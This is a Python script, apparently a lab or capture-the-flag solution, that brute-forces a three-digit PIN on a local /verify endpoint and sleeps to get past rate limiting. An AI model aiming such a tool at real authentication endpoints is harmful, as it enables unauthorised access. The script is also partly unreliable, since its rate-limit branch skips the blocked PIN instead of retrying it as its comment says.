import socket
import time

def send_post_request(pin):
    host = "127.0.0.1"
    port = 8888
    resource = "/verify"
    
    # Define the form data with a variable pin
    form_data = f"magicNumber={pin:03d}"
    
    # Create the HTTP POST request with headers
    request = f"""POST {resource} HTTP/1.1\r\nHost: {host}:{port}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {len(form_data)}\r\nConnection: close\r\n\r\n{form_data}"""
    
    # Connect to the server
    try:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.settimeout(5)
        client_socket.connect((host, port))
        
        # Send the HTTP request
        client_socket.sendall(request.encode())

        # Receive the response
        response = b""
        while True:
            data = client_socket.recv(4096)
            if not data:
                break
            response += data
        
        # Close the connection
        client_socket.close()

        # Return the response decoded
        return response.decode(errors="ignore")

    except socket.error as e:
        return f"Socket error: {e}"
    except Exception as e:
        return f"An error occurred: {e}"

def brute_force_pin():
    for pin in range(1000):  # 000 to 999
        print(f"Trying PIN: {pin:03d}")
        response = send_post_request(pin)
        
        if "Incorrect number" in response:
            print(f"❌PIN {pin:03d} is incorrect.")
        elif "Please wait" in response:
            print(f"PIN {pin:03d} blocked for rate limiting — retrying...")
            time.sleep(1)
            continue  # Retry after sleep
        else:
            print(f"\n✅SUCCESS! The PIN is {pin:03d}")
            print(response)
            break
        
        time.sleep(1)

# Run the brute force function
if __name__ == "__main__":
    brute_force_pin()
